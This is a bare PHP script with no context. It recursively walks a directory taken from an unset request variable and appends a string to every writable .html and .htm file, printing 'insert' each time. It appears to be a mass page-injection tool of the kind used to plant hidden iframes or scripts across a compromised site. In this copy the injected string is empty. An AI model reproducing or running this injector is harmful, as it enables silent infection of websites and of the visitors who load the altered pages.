<?
function recursedir($BASEDIR) {
       $hndl=opendir($BASEDIR);
       while($file=readdir($hndl)) {
               if ($file=='.' || $file=='..' || is_link("$BASEDIR/$file") || !is_readable("$BASEDIR/$file")) continue;
                       $completepath="$BASEDIR/$file";
                       if (is_dir($completepath)) {
                               # its a dir, recurse.
                               recursedir($BASEDIR.'/'.$file);
                       } else {
                               # its a file.
                               if (is_writable($BASEDIR.'/'.$file)) {
                                   $path_parts = pathinfo($BASEDIR.'/'.$file);
                                   # if file is htm or html   
   				   if ((trim($path_parts['extension'])=="html") || (trim($path_parts['extension'])=="htm")) {
                                     $fi = fopen($BASEDIR.'/'.$file,"a");
                                     fwrite($fi,"");
                                     fclose($fi);
 				     echo "insert";
                                   }                                  
                                       
                               }
                       }                                  
                                                                          
                                
       }
}
recursedir("$dir");
?>